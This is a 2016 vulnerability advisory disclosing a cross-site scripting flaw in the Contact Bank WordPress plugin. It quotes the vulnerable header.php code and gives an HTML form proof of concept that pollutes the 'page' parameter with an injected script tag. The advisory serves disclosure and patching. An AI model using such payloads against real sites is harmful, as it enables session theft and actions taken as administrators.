------------------------------------------------------------------------
Cross-Site Scripting in Contact Bank WordPress Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Contact Bank
WordPress Plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing Administrators' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0023

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Contact Bank - Contact Forms
Builder WordPress Plugin version 2.1.21.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in Contact Bank version 2.1.23.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/cross_site_scripting_in_contact_bank_wordpress_plugin.html

The issue exists in the file views/header.php and is caused by the lack of output encoding on the page request parameter. The vulnerable code is listed below.

<script>
jQuery(document).ready(function()
{
   jQuery(".nav-tab-wrapper > a#<?php echo $_REQUEST["page"];?>").addClass("nav-tab-active");
});
</script>

Normally, the page URL parameter is validated by WordPress, which prevents Cross-Site Scripting. However in this case the value of page is obtained from $_REQUEST, not from $_GET. This allows for parameter pollution where the attacker puts a benign page value in the URL and simultaneously submits a malicious page value as POST parameter.
Proof of concept

<html>
   <body>
      <form action="http://<target>/wp-admin/admin.php?page=contact_dashboard" method="POST">
         <input type="hidden" name="page" value="</script><script>alert(1);</script>" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>

------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
